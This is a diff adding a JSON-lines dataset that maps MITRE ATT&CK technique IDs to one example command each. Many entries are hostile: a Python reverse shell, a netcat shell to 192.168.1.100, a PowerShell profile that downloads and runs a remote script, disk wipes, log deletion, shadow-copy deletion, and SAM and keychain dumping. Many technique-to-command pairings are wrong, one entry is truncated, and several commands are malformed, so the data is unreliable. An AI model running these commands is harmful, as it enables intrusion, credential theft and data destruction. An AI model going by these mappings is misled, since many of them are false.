@@ -1,0 +1,835 @@
+{"ID": "T1055.011", "Name": "Extra Window Memory Injection", "Platform": "Windows", "Command": "CreateWindowEx(0, \"ExtraWindowClass\", NULL, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 0, 0, NULL, NULL, NULL, NULL);"}
+{"ID": "T1053.005", "Name": "Scheduled Task", "Platform": "Windows", "Command": "schtasks /create /tn \"TaskName\" /tr \"C:\\path\\to\\malicious.exe\" /sc daily /st 08:00 /sd 01/01/24"}
+{"ID": "T1205.002", "Name": "Socket Filters", "Platform": "Linux", "Command": "tcpdump -i eth0 'tcp port 80 and src host 192.168.1.100'"}
+{"ID": "T1066", "Name": "Indicator Removal from Tools", "Platform": "Linux", "Command": "rm -i /var/log/syslog"}
+{"ID": "T1560.001", "Name": "Archive via Utility", "Platform": "Linux", "Command": "tar -czf archive.tar.gz /path/to/data"}
+{"ID": "T1021.005", "Name": "VNC", "Platform": "Linux", "Command": "vncviewer -connect <target_IP>"}
+{"ID": "T1047", "Name": "Windows Management Instrumentation", "Platform": "Windows", "Command": "wmic.exe shadowcopy delete"}
+{"ID": "T1156", "Name": "Malicious Shell Modification", "Platform": "Linux", "Command": "echo 'bash -c \"malicious_binary\"' >> /etc/profile"}
+{"ID": "T1113", "Name": "Screen Capture", "Platform": "Linux", "Command": "import pyautogui"}
+{"ID": "T1027.011", "Name": "Fileless Storage", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"FilelessStorage\" /t REG_SZ /d \"C:\\path\\to\\malicious\\executable\""}
+{"ID": "T1067", "Name": "Bootkit", "Platform": "Linux", "Command": "dd if=/dev/zero of=/dev/sda bs=512 count=1"}
+{"ID": "T1037", "Name": "Boot or Logon Initialization Scripts", "Platform": "macOS", "Command": "launchctl load -w /Library/LaunchAgents/com.adversary.script.plist"}
+{"ID": "T1557", "Name": "Adversary-in-the-Middle", "Platform": "Linux", "Command": "sudo apt install dnsrebind"}
+{"ID": "T1033", "Name": "System Owner/User Discovery", "Platform": "Linux", "Command": "who"}
+{"ID": "T1583", "Name": "Acquire Infrastructure", "Platform": "PRE", "Command": "acquire infrastructure"}
+{"ID": "T1218.011", "Name": "Rundll32", "Platform": "Windows", "Command": "rundll32.exe example.dll,ExampleFunctionA"}
+{"ID": "T1613", "Name": "Container and Resource Discovery", "Platform": "Containers", "Command": "docker ps -a"}
+{"ID": "T1583.007", "Name": "Serverless", "Platform": "PRE", "Command": "nmap -sS -Pn -p 80 8.8.8.8"}
+{"ID": "T1143", "Name": "Hidden Window", "Platform": "macOS", "Command": "defaults write com.apple.finder AppleShowAllFiles -bool true; killall Finder"}
+{"ID": "T1161", "Name": "LC_LOAD_DYLIB Addition", "Platform": "macOS", "Command": "otool -l --all /path/to/binary | grep LC_LOAD_DYLIB | awk '{print $1}' | xargs otool -l -v --all | grep LC_LOAD_DYLIB | awk '{print $1}' | xargs install_name_tool -add_rpath /path/to/dylib /path/to/binary"}
+{"ID": "T1132.001", "Name": "Standard Encoding", "Platform": "ESXi", "Command": "base64 -d -i /path/to/encoded/file"}
+{"ID": "T1027.009", "Name": "Embedded Payloads", "Platform": "Linux", "Command": "msfvenom -p linux/x86/exec CMD=\"bash -c 'bash -c /bin/sh'\" -f elf -o payload.elf"}
+{"ID": "T1150", "Name": "Plist Modification", "Platform": "macOS", "Command": "defaults write /Library/Preferences/com.apple.loginitems.plist LSHandlers -array-add '{\"LSHandlerContentType\" = \"public.file-url\"; \"LSHandlerRole\" = \"None\"; \"LSHandlerURL\" = \"file:///path/to/malicious/executable\"}'"}
+{"ID": "T1556.003", "Name": "Pluggable Authentication Modules", "Platform": "Linux", "Command": "sudo grep -r pam_unix.so /etc/pam.d/*"}
+{"ID": "T1578.004", "Name": "Revert Cloud Instance", "Platform": "IaaS", "Command": "aws ec2 restore-image-from-recovery-point --recovery-point-arn arn:aws:ec2:region:account-id:recovery-point/recovery-point-id"}
+{"ID": "T1148", "Name": "HISTCONTROL", "Platform": "Linux", "Command": "export HISTCONTROL=ignorespace"}
+{"ID": "T1592", "Name": "Gather Victim Host Information", "Platform": "PRE", "Command": "nmap -sV <target_IP>"}
+{"ID": "T1596.003", "Name": "Digital Certificates", "Platform": "PRE", "Command": "openssl s_client -connect example.com:443 -servername example.com -servername www.example.com"}
+{"ID": "T1056.001", "Name": "Keylogging", "Platform": "Linux", "Command": "sudo apt install xkeysnow"}
+{"ID": "T1564.012", "Name": "File/Path Exclusions", "Platform": "Linux", "Command": "ls -a /var/lib/ && ls -a /var/log && ls -a /var/tmp"}
+{"ID": "T1222.002", "Name": "Linux and Mac File and Directory Permissions Modification", "Platform": "macOS", "Command": "chmod 755 /path/to/file_or_directory"}
+{"ID": "T1110.001", "Name": "Password Guessing", "Platform": "Windows", "Command": "net user username *"}
+{"ID": "T1216.001", "Name": "PubPrn", "Platform": "Windows", "Command": "cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=com"}
+{"ID": "T1597.002", "Name": "Purchase Technical Data", "Platform": "PRE", "Command": "python purchase_technical_data.py"}
+{"ID": "T1003", "Name": "OS Credential Dumping", "Platform": "Linux", "Command": "mimikatz -help"}
+{"ID": "T1129", "Name": "Shared Modules", "Platform": "Linux", "Command": "dlopen(\"/path/to/malicious.so\", RTLD_LAZY)"}
+{"ID": "T1602", "Name": "Data from Configuration Repository", "Platform": "Network Devices", "Command": "show running"}
+{"ID": "T1561.002", "Name": "Disk Structure Wipe", "Platform": "Linux", "Command": "dd if=/dev/zero of=/dev/sda bs=512 count=1"}
+{"ID": "T1498.001", "Name": "Direct Network Flood", "Platform": "Windows", "Command": "netsh.exe interface ip set interface \"Ethernet\" forwarding=disabled"}
+{"ID": "T1492", "Name": "Stored Data Manipulation", "Platform": "Linux", "Command": "echo \"Hello World\" >> /var/log/syslog"}
+{"ID": "T1574.007", "Name": "Path Interception by PATH Environment Variable", "Platform": "Windows", "Command": "setx PATH \"C:\\example path;C:\\Windows\\system32;C:\\Windows\""}
+{"ID": "T1213.002", "Name": "Sharepoint", "Platform": "Windows", "Command": "powershell -c \"Get-SPWeb -Identity 'https://sharepointurl' | Get-SPSite | Select-Object -ExpandProperty Url\""}
+{"ID": "T1006", "Name": "Direct Volume Access", "Platform": "Network Devices", "Command": "ninja copy"}
+{"ID": "T1044", "Name": "File System Permissions Weakness", "Platform": "Windows", "Command": "icacls \"C:\\Windows\\System32\\svchost.exe\" /inheritance:r"}
+{"ID": "T1588.007", "Name": "Artificial Intelligence", "Platform": "PRE", "Command": "python ai_model = torch.hub.load(\"huggingface-transformers\", \"t5-small\")"}
+{"ID": "T1666", "Name": "Modify Cloud Resource Hierarchy", "Platform": "IaaS", "Command": "aws organizations leave-organization"}
+{"ID": "T1564.008", "Name": "Email Hiding Rules", "Platform": "Windows", "Command": "New-InboxRule -Name \"HiddenSecurityAlerts\" -Mailbox <mailbox_name> -SubjectContainsText \"security\" -MoveToFolder \"Deleted Items\""}
+{"ID": "T1491.002", "Name": "External Defacement", "Platform": "Windows", "Command": "net stop w3svc"}
+{"ID": "T1027.013", "Name": "Encrypted/Encoded File", "Platform": "Linux", "Command": "openssl enc -aes-256-cbc -in input.txt -out output.txt -k my_secret_key"}
+{"ID": "T1171", "Name": "LLMNR/NBT-NS Poisoning and Relay", "Platform": "Windows", "Command": "nbtstat -a <target_IP>"}
+{"ID": "T1590.005", "Name": "IP Addresses", "Platform": "PRE", "Command": "whois example.com"}
+{"ID": "T1499.001", "Name": "OS Exhaustion Flood", "Platform": "Linux", "Command": "hping3 -S -c 10000 -a 192.168.1.100"}
+{"ID": "T1014", "Name": "Rootkit", "Platform": "Linux", "Command": "sudo apt install rkhunter"}
+{"ID": "T1546.013", "Name": "PowerShell Profile", "Platform": "Windows", "Command": "New-Item -Path $PROFILE -ItemType File -Value 'Invoke-WebRequest http://example.com/malicious.ps1 -Method Get -UseBasicParsing; Invoke-Expression (New-Object System.Net.WebClient).DownloadString(\"http://example.com/malicious.ps1\")'"}
+{"ID": "T1059.007", "Name": "JavaScript", "Platform": "Linux", "Command": "node./script_name.js"}
+{"ID": "T1590.002", "Name": "DNS", "Platform": "PRE", "Command": "dig +nocmd +multiline @ns1.example.com example.com axfr"}
+{"ID": "T1501", "Name": "Systemd Service", "Platform": "Linux", "Command": "systemctl enable my_service.service"}
+{"ID": "T1485.001", "Name": "Lifecycle-Triggered Deletion", "Platform": "IaaS", "Command": "az storage container delete --name mycontainer --resource-group myresourcegroup --yes"}
+{"ID": "T1514", "Name": "Elevated Execution with Prompt", "Platform": "macOS", "Command": "AuthorizationExecuteWithPrivileges \"/path/to/malicious/script\""}
+{"ID": "T1123", "Name": "Audio Capture", "Platform": "Linux", "Command": "arecord -f cd -t wav -d 10 -d 10 /tmp/audio.wav"}
+{"ID": "T1543", "Name": "Create or Modify System Process", "Platform": "Windows", "Command": "sc config <service_name> start= auto & net start <service_name>"}
+{"ID": "T1133", "Name": "External Remote Services", "Platform": "Containers", "Command": "docker exec -it <container_id> /bin/bash"}
+{"ID": "T1109", "Name": "Component Firmware", "Platform": "Windows", "Command": "wmic bios get safebootmode"}
+{"ID": "T1546.006", "Name": "LC_LOAD_DYLIB Addition", "Platform": "macOS", "Command": "otool -l -v /path/to/malicious.dylib | grep LC_LOAD_DYLIB | sed's/.* LC_LOAD_DYLIB /LC_LOAD_DYLIB \\/path\\/to\\/malicious.dylib /' | xargs otool -add_load_dylib -f"}
+{"ID": "T1539", "Name": "Steal Web Session Cookie", "Platform": "Linux", "Command": "curl -s -H 'Cookie: session_id=acquired_cookie_value' 'http://example.com'"}
+{"ID": "T1053.007", "Name": "Container Orchestration Job", "Platform": "Containers", "Command": "kubectl create job malicious-deployment --image=<image-name> --schedule=\"0 0 * * *\""}
+{"ID": "T1568.002", "Name": "Domain Generation Algorithms", "Platform": "Linux", "Command": "dig istgmxdejdnxyla.ru"}
+{"ID": "T1036.007", "Name": "Double File Extension", "Platform": "Windows", "Command": "dir *.txt"}
+{"ID": "T1548.002", "Name": "Bypass User Account Control", "Platform": "Windows", "Command": "runas /user \"administrator\" \"cmd.exe\""}
+{"ID": "T1099", "Name": "Timestomp", "Platform": "Linux", "Command": "touch -d 2022-01-01 '/path/to/file'"}
+{"ID": "T1496.003", "Name": "SMS Pumping", "Platform": "SaaS", "Command": "twilio account update --sms-url=https://example.com/sms-pumping-endpoint"}
+{"ID": "T1016.001", "Name": "Internet Connection Discovery", "Platform": "Windows", "Command": "ping -c 1 8.8.8.8"}
+{"ID": "T1548.003", "Name": "Sudo and Sudo Caching", "Platform": "Linux", "Command": "Defaults   !tty_tickets"}
+{"ID": "T1560.003", "Name": "Archive via Custom Method", "Platform": "Linux", "Command": "python -c 'import zlib; import os; with open(\"file.txt\", \"rb\") as f: data = f.read(); compressed = zlib.compress(data); with open(\"file.txt.zlib\", \"wb\") as f: f.write(compressed)'"}
+{"ID": "T1578", "Name": "Modify Cloud Compute Infrastructure", "Platform": "IaaS", "Command": "aws ec2 modify-instance-attribute --instance-id i-0123456789abcdef0 --instance-attribute instance-type --instance-type c5.xlarge"}
+{"ID": "T1584.008", "Name": "Network Devices", "Platform": "PRE", "Command": "nmap -sC -sV 192.168.1.1/24"}
+{"ID": "T1583.008", "Name": "Malvertising", "Platform": "PRE", "Command": "python -c 'import requests; r = requests.get(\"https://example.com/malicious-ad\"); r.raise_for_status(); open(\"malicious-ad.html\", \"wb\").write(r.content)'"}
+{"ID": "T1069", "Name": "Permission Groups Discovery", "Platform": "Containers", "Command": "id -Z"}
+{"ID": "T1114", "Name": "Email Collection", "Platform": "Windows", "Command": "net use \\\\server\\share /user:domain\\username \"password\""}
+{"ID": "T1003.002", "Name": "Security Account Manager", "Platform": "Windows", "Command": "reg save HKLM\\sam \"sam\""}
+{"ID": "T1596.002", "Name": "WHOIS", "Platform": "PRE", "Command": "whois example.com"}
+{"ID": "T1542.001", "Name": "System Firmware", "Platform": "Windows", "Command": "bcdedit /set {bootmgr} bootsequence multi(0)disk(0)rdisk(0)partition(1)\\EFI\\Microsoft\\Boot\\bootmgfw.efi"}
+{"ID": "T1594", "Name": "Search Victim-Owned Websites", "Platform": "PRE", "Command": "nmap -sC -p 80,443 target.com"}
+{"ID": "T1069.003", "Name": "Cloud Groups", "Platform": "SaaS", "Command": "Get-MsolUserRole"}
+{"ID": "T1574.011", "Name": "Services Registry Permissions Weakness", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\CurrentControlSet\\Services\\WinSock2\\Parameters\" /v AutodiaDLL /t REG_SZ /d \"c:\\temp\\foo.dll\""}
+{"ID": "T1596.001", "Name": "DNS/Passive DNS", "Platform": "PRE", "Command": "dig @ns1.example.com example.com"}
+{"ID": "T1499.003", "Name": "Application Exhaustion Flood", "Platform": "Windows", "Command": "powershell -c \"while($true){Invoke-WebRequest -Uri 'http://targetwebsite.com/resource-intensive-feature'}\""}
+{"ID": "T1163", "Name": "Rc.common", "Platform": "macOS", "Command": "echo 'echo \"malicious command\" | sudo bash' >> /etc/rc.local"}
+{"ID": "T1195.001", "Name": "Compromise Software Dependencies and Development Tools", "Platform": "Linux", "Command": "pip install --trusted-host pypi.python.org package_name"}
+{"ID": "T1588.004", "Name": "Digital Certificates", "Platform": "PRE", "Command": "certutil.exe -addstore -f -f \"ROOT\" \"path\\to\\cert.cer\""}
+{"ID": "T1583.002", "Name": "DNS Server", "Platform": "PRE", "Command": "dnsmasq -d"}
+{"ID": "T1561", "Name": "Disk Wipe", "Platform": "Linux", "Command": "dd if=/dev/zero of=/dev/sdb bs=4096 count=1"}
+{"ID": "T1071.004", "Name": "DNS", "Platform": "Linux", "Command": "dig +short TXT example.com @resolver1.example.com"}
+{"ID": "T1552.005", "Name": "Cloud Instance Metadata API", "Platform": "IaaS", "Command": "curl http://169.254.169.254/latest/meta-data/instance-id"}
+{"ID": "T1555.002", "Name": "Securityd Memory", "Platform": "Linux", "Command": "gdb -q -p $(pgrep -d '' securityd)"}
+{"ID": "T1615", "Name": "Group Policy Discovery", "Platform": "Windows", "Command": "gpresult /r"}
+{"ID": "T1542.003", "Name": "Bootkit", "Platform": "Linux", "Command": "dd if=/dev/zero of=/dev/sda bs=512 count=1"}
+{"ID": "T1025", "Name": "Data from Removable Media", "Platform": "Linux", "Command": "lsblk"}
+{"ID": "T1116", "Name": "Code Signing", "Platform": "macOS", "Command": "spctl validate --type execute --verbose /path/to/executable"}
+{"ID": "T1218.013", "Name": "Mavinject", "Platform": "Windows", "Command": "C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL"}
+{"ID": "T1522", "Name": "Cloud Instance Metadata API", "Platform": "IaaS", "Command": "curl http://169.254.169.254/latest/meta-data/instance-id"}
+{"ID": "T1093", "Name": "Process Hollowing", "Platform": "Windows", "Command": "`powershell -c \"Add-Type -TypeDefinition '[DllImport(\\\"kernel32.dll\\\")] public static class Win32{public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId); public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, int dwFreeType); public static extern IntPtr VirtualAlloc(IntPtr hProcess, IntPtr lpAddress, int dwSize, int flAllocationType, int dwAlign); public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOf"}
+{"ID": "T1074.001", "Name": "Local Data Staging", "Platform": "ESXi", "Command": "vmkfstools -F /path/to/stage/location -I /path/to/source/location"}
+{"ID": "T1036.005", "Name": "Match Legitimate Resource Name or Location", "Platform": "Containers", "Command": "kubectl create deployment legitimate-resource --image=<malicious-image>"}
+{"ID": "T1172", "Name": "Domain Fronting", "Platform": "Linux", "Command": "openssl s_client -connect example.com:443 -servername example.com -servername example.net -servername example.io"}
+{"ID": "T1587.003", "Name": "Digital Certificates", "Platform": "PRE", "Command": "certreq -srvcert -cfg \"C:\\path\\to\\certreq.cfg\""}
+{"ID": "T1565.001", "Name": "Stored Data Manipulation", "Platform": "Linux", "Command": "echo \"Hello World\" >> /var/log/syslog"}
+{"ID": "T1110.002", "Name": "Password Cracking", "Platform": "Linux", "Command": "john --format=raw-md5 --wordlist=/path/to/dictionary.txt /path/to/hashes.txt"}
+{"ID": "T1178", "Name": "SID-History Injection", "Platform": "Windows", "Command": "net localgroup \"Enterprise Admins\" /add \"S-1-5-21-1234567890-1234567890-1234567890-500\""}
+{"ID": "T1114.001", "Name": "Local Email Collection", "Platform": "Windows", "Command": "dir \"C:\\Users\\<username>\\Documents\\Outlook Files\\*.ost\""}
+{"ID": "T1555.001", "Name": "Keychain", "Platform": "macOS", "Command": "security dump-keychain -d"}
+{"ID": "T1547", "Name": "Boot or Logon Autostart Execution", "Platform": "Linux", "Command": "crontab -e"}
+{"ID": "T1003.004", "Name": "LSA Secrets", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Policy\\Secrets\" /v /f"}
+{"ID": "T1013", "Name": "Port Monitors", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32\" /v Local Port /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"ID": "T1600", "Name": "Weaken Encryption", "Platform": "Network Devices", "Command": "show run | include crypto"}
+{"ID": "T1606.002", "Name": "SAML Tokens", "Platform": "SaaS", "Command": "Get-ADFSRelyingPartyTrust | Where-Object {$_.Identifier -eq \"https://example.com\"} | Set-ADFSRelyingPartyTrust -AccessTokenLifetime 1"}
+{"ID": "T1192", "Name": "Spearphishing Link", "Platform": "Windows", "Command": "powershell -c \"Invoke-WebRequest -Uri 'https://example.com/malicious.exe' -OutFile C:\\Users\\username\\Downloads\\malware.exe\""}
+{"ID": "T1036.008", "Name": "Masquerade File Type", "Platform": "Linux", "Command": "mv /path/to/malicious_file.php /path/to/masqueraded_file.gif"}
+{"ID": "T1489", "Name": "Service Stop", "Platform": "ESXi", "Command": "vmware-cmd -g \"stop <service_name>\""}
+{"ID": "T1587.001", "Name": "Malware", "Platform": "PRE", "Command": "python setup.py sdist"}
+{"ID": "T1121", "Name": "Regsvcs/Regasm", "Platform": "Windows", "Command": "regasm /codebase /uninstall \"C:\\path\\to\\malicious.dll\""}
+{"ID": "T1652", "Name": "Device Driver Discovery", "Platform": "Linux", "Command": "lsmod"}
+{"ID": "T1206", "Name": "Sudo Caching", "Platform": "Linux", "Command": "sudo sysctl -w fs.inotify.max_user_watches=12288"}
+{"ID": "T1087.002", "Name": "Domain Account", "Platform": "Linux", "Command": "ldapsearch -x -H ldaps://ldap.example.com -D \"cn=admin,dc=example,dc=com\" -w -b \"dc=example,dc=com\" \"(objectClass=person)\""}
+{"ID": "T1547.014", "Name": "Active Setup", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{GUID}\" /v StubPath /t REG_SZ /d \"C:\\path\\to\\malware.exe\""}
+{"ID": "T1564", "Name": "Hide Artifacts", "Platform": "Linux", "Command": "sudo ls -l"}
+{"ID": "T1559.002", "Name": "Dynamic Data Exchange", "Platform": "Windows", "Command": "cmd /c \"calc.exe\""}
+{"ID": "T1204.002", "Name": "Malicious File", "Platform": "Linux", "Command": "mv /tmp/malicious_file.iso /home/user/Desktop && chmod +x /tmp/malicious_file.iso && mv /tmp/malicious_file.iso /home/user/Desktop/malicious_file.iso && chmod 755 /home/user/Desktop/malicious_file.iso && echo \"Click to execute the file\" > /home/user/Desktop/README.txt"}
+{"ID": "T1591.003", "Name": "Identify Business Tempo", "Platform": "PRE", "Command": "Identify business tempo."}
+{"ID": "T1063", "Name": "Security Software Discovery", "Platform": "macOS", "Command": "ps aux | grep -i \"LittleSnitch\""}
+{"ID": "T1071.005", "Name": "Publish/Subscribe Protocols", "Platform": "macOS", "Command": "mosh -a -t 1883 -p 1884 -v -x 127.0.0.1"}
+{"ID": "T1592.001", "Name": "Hardware", "Platform": "PRE", "Command": "nmap -sV <target_IP>"}
+{"ID": "T1080", "Name": "Taint Shared Content", "Platform": "Windows", "Command": "cmd /c \"copy C:\\malware.exe C:\\path\\to\\shared\\directory\\executable.exe && copy C:\\path\\to\\shared\\directory\\executable.exe C:\\path\\to\\shared\\directory\\executable.exe.bak && copy /b C:\\path\\to\\shared\\directory\\executable.exe + C:\\malware.exe C:\\path\\to\\shared\\directory\\executable.exe.bak\""}
+{"ID": "T1484.002", "Name": "Trust Modification", "Platform": "Identity Provider", "Command": "az ad federated-domain enable --domain-name <name> --tenant-object-id <tenant-id>"}
+{"ID": "T1213.006", "Name": "Databases", "Platform": "Linux", "Command": "mysql -e \"SELECT * FROM table_name;\""}
+{"ID": "T1573.001", "Name": "Symmetric Cryptography", "Platform": "ESXi", "Command": "esxcli storage filesystem snapshot remove -l <snapshot_label>"}
+{"ID": "T1087.001", "Name": "Local Account", "Platform": "ESXi", "Command": "esxcli system account list"}
+{"ID": "T1167", "Name": "Securityd Memory", "Platform": "macOS", "Command": "gdb -q -p $(pgrep -d '' securityd)"}
+{"ID": "T1586.001", "Name": "Social Media Accounts", "Platform": "PRE", "Command": "python social_media_accounts.py"}
+{"ID": "T1176.001", "Name": "Browser Extensions", "Platform": "Linux", "Command": "sudo apt install chromium-browser"}
+{"ID": "T1527", "Name": "Application Access Token", "Platform": "SaaS", "Command": "curl -X GET 'https://api.example.com/endpoint' -H 'Authorization: Bearer <access_token>'"}
+{"ID": "T1562.009", "Name": "Safe Mode Boot", "Platform": "Windows", "Command": "bcdedit /set {current} safeboot minimal"}
+{"ID": "T1180", "Name": "Screensaver", "Platform": "Windows", "Command": "reg add \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"C:\\path\\to\\malicious\\scr\\file.scr\" /f"}
+{"ID": "T1542.005", "Name": "TFTP Boot", "Platform": "Network Devices", "Command": "tftp -i 192.168.1.100 -c /path/to/malicious/image"}
+{"ID": "T1543.003", "Name": "Windows Service", "Platform": "Windows", "Command": "sc create \"Malicious Service\" binPath= \"C:\\path\\to\\malicious.exe\" start= auto"}
+{"ID": "T1568.001", "Name": "Fast Flux DNS", "Platform": "Linux", "Command": "dig +xfr @ns1.example.com example.com. A"}
+{"ID": "T1497.001", "Name": "System Checks", "Platform": "Linux", "Command": "dmidecode -s system-product-name"}
+{"ID": "T1053.003", "Name": "Cron", "Platform": "Linux", "Command": "crontab -e"}
+{"ID": "T1069.002", "Name": "Domain Groups", "Platform": "Linux", "Command": "ldapsearch -x -H ldaps://ldap.example.com -D \"CN=administrator,CN=users,DC=example,DC=com\" -W -b \"DC=example,DC=com\" \"(objectClass=group)\" distinguishedName"}
+{"ID": "T1588.006", "Name": "Vulnerabilities", "Platform": "PRE", "Command": "nmap -sV <target_IP>"}
+{"ID": "T1566.002", "Name": "Spearphishing Link", "Platform": "Identity Provider", "Command": "GET / HTTP/1.1\nHost: example.com\nConnection: close"}
+{"ID": "T1165", "Name": "Startup Items", "Platform": "macOS", "Command": "mv /Library/Startup\\ Items/MyStartupItem/StartupParameters.plist /Library/Startup\\ Items/MyStartupItem/StartupParameters.plist"}
+{"ID": "T1070.002", "Name": "Clear Linux or Mac System Logs", "Platform": "Linux", "Command": "sudo rm -rf /var/log/*"}
+{"ID": "T1499.004", "Name": "Application or System Exploitation", "Platform": "Windows", "Command": "net stop \"iis\""}
+{"ID": "T1137", "Name": "Office Application Startup", "Platform": "Windows", "Command": "reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\Setup\" /v \"Persistent\" /t REG_DWORD /d 1"}
+{"ID": "T1218.004", "Name": "InstallUtil", "Platform": "Windows", "Command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe \"C:\\path\\to\\malicious.dll\""}
+{"ID": "T1598.003", "Name": "Spearphishing Link", "Platform": "PRE", "Command": "curl -X GET 'http://example.com/phishing-page'"}
+{"ID": "T1021.004", "Name": "SSH", "Platform": "ESXi", "Command": "vim-cmd hostsvc/enable_ssh"}
+{"ID": "T1098.003", "Name": "Additional Cloud Roles", "Platform": "IaaS", "Command": "aws iam create-policy --policy-name \"AdditionalRolesPolicy\" --policy-document \"{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Statement\\\":[{\\\"Sid\\\":\\\"AllowAdditionalRoles\\\",\\\"Effect\\\":\\\"Allow\\\",\\\"Action\\\":[\\\"iam:CreateServiceLinkedRole\\\"],\\\"Resource\\\":\\\"*\\\"}]\""}
+{"ID": "T1547.012", "Name": "Print Processors", "Platform": "Windows", "Command": "sc config spoolsv start= auto & net start spoolsv"}
+{"ID": "T1089", "Name": "Disabling Security Tools", "Platform": "Linux", "Command": "pkill -9 auditd"}
+{"ID": "T1487", "Name": "Disk Structure Wipe", "Platform": "Windows", "Command": "wmic diskdrive delete"}
+{"ID": "T1566.001", "Name": "Spearphishing Attachment", "Platform": "Linux", "Command": "echo 'This is a test' > malicious_file.txt && echo 'This is a test' > malicious_file.txt; cat malicious_file.txt | mail -s \"Test Email\" victim@example.com"}
+{"ID": "T1214", "Name": "Credentials in Registry", "Platform": "Windows", "Command": "reg query HKLM /f \"password\" /t REG_SZ /s"}
+{"ID": "T1027.008", "Name": "Stripped Payloads", "Platform": "macOS", "Command": "otool -l /path/to/malicious_binary"}
+{"ID": "T1559.001", "Name": "Component Object Model", "Platform": "Windows", "Command": "reg add \"HKCR\\CLSID\\{00021401-0000-0000-c000-000000000046}\" /ve /t REG_SZ /d \"Malicious DLL Path\""}
+{"ID": "T1574.001", "Name": "DLL", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MaliciousDLL\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\""}
+{"ID": "T1119", "Name": "Automated Collection", "Platform": "IaaS", "Command": "aws s3 sync s3://bucket-name /local/directory"}
+{"ID": "T1115", "Name": "Clipboard Data", "Platform": "Linux", "Command": "pbpaste"}
+{"ID": "T1003.007", "Name": "Proc Filesystem", "Platform": "Linux", "Command": "grep -E \"^[0-9a-f-]* r\" /proc/$PID/maps | cut -d''-f 1"}
+{"ID": "T1583.005", "Name": "Botnet", "Platform": "PRE", "Command": "python -c 'import socket,subprocess; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"target_ip\",port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn(\"/bin/bash\")'"}
+{"ID": "T1555.005", "Name": "Password Managers", "Platform": "Linux", "Command": "pspy64 -f -l | grep -E 'password|master'"}
+{"ID": "T1103", "Name": "AppInit DLLs", "Platform": "Windows", "Command": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs /t REG_SZ /d \"path\\to\\malicious.dll\" /f"}
+{"ID": "T1553.001", "Name": "Gatekeeper Bypass", "Platform": "macOS", "Command": "spctl kextload /path/to/malicious.kext"}
+{"ID": "T1675", "Name": "ESXi Administration Command", "Platform": "ESXi", "Command": "vmware-cmd -g \"guestinfo.getCmdLine\""}
+{"ID": "T1608.004", "Name": "Drive-by Target", "Platform": "PRE", "Command": "nmap -sC -sV <target_IP>"}
+{"ID": "T1007", "Name": "System Service Discovery", "Platform": "Linux", "Command": "systemctl --type=service"}
+{"ID": "T1040", "Name": "Network Sniffing", "Platform": "Linux", "Command": "tshark -i any -b filesize:1024 -c 100 -w sniff.cap"}
+{"ID": "T1017", "Name": "Application Deployment Software", "Platform": "Linux", "Command": "sudo apt-get install <malicious_software_package>"}
+{"ID": "T1553.002", "Name": "Code Signing", "Platform": "macOS", "Command": "spctl validate --type execute --verbose /path/to/executable"}
+{"ID": "T1530", "Name": "Data from Cloud Storage", "Platform": "IaaS", "Command": "aws s3 ls"}
+{"ID": "T1565.003", "Name": "Runtime Data Manipulation", "Platform": "Linux", "Command": "`echo \"Hello, Earth!\" | sed's/World/Earth/'"}
+{"ID": "T1552.002", "Name": "Credentials in Registry", "Platform": "Windows", "Command": "reg query HKLM /f \"password\" /t REG_SZ /s"}
+{"ID": "T1135", "Name": "Network Share Discovery", "Platform": "Linux", "Command": "smbclient -L \\\\remotesystem"}
+{"ID": "T1120", "Name": "Peripheral Device Discovery", "Platform": "Linux", "Command": "lshw -c | grep \"bus\""}
+{"ID": "T1036.009", "Name": "Break Process Trees", "Platform": "Linux", "Command": "exec /bin/sh -c \"fork; fork; exit\""}
+{"ID": "T1590.004", "Name": "Network Topology", "Platform": "PRE", "Command": "nmap -sV -A -O 192.168.1.0/24"}
+{"ID": "T1587.002", "Name": "Code Signing Certificates", "Platform": "PRE", "Command": "openssl req -x509 -newkey rsa:2048 -nodes -keyout selfsigned.key -out selfsigned.crt -days 365 -subj \"/C=US/ST=State/L=Locality/O=Organization/CN=example.com\""}
+{"ID": "T1222.001", "Name": "Windows File and Directory Permissions Modification", "Platform": "Windows", "Command": "icacls C:\\path\\to\\file.txt /grant:r \"Domain Users\":R"}
+{"ID": "T1137.006", "Name": "Add-ins", "Platform": "Windows", "Command": "reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Addins\\MyAddin\" /v LoadBehavior /t REG_DWORD /d 2"}
+{"ID": "T1505.002", "Name": "Transport Agent", "Platform": "Linux", "Command": "getent passwd"}
+{"ID": "T1082", "Name": "System Information Discovery", "Platform": "ESXi", "Command": "esxcli system hostname get"}
+{"ID": "T1071", "Name": "Application Layer Protocol", "Platform": "Linux", "Command": "nc -e /bin/bash 192.168.1.100 443"}
